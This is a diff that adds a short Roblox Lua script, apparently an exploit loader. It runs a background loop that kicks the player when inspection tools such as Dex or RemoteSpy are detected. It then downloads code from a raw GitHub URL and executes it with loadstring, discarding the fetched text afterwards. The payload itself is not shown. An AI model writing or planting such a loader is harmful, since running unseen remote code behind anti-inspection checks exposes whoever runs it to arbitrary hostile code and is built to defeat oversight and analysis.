@@ -1,0 +1,25 @@
+local p, c, lp = game:GetService("Players"), game:GetService("CoreGui"), game:GetService("Players").LocalPlayer
+
+task.spawn(function()
+    while task.wait(1) do
+        for _, n in ipairs({"Dex", "Explorer", "Spy", "RemoteSpy"}) do
+            if c:FindFirstChild(n) or (lp:FindFirstChild("PlayerGui") and lp.PlayerGui:FindFirstChild(n)) then
+                lp:Kick("Security Alert")
+                return
+            end
+        end
+    end
+end)
+
+local function sL()
+    local s, r = pcall(function() 
+        return game:HttpGet("https://raw.githubusercontent.com/SLOTH-neo/Sloth/refs/heads/main/YESorNO") 
+    end)
+    if s and r then
+        local f = loadstring(r)
+        r = nil
+        if f then pcall(f) end
+    end
+end
+
+sL()
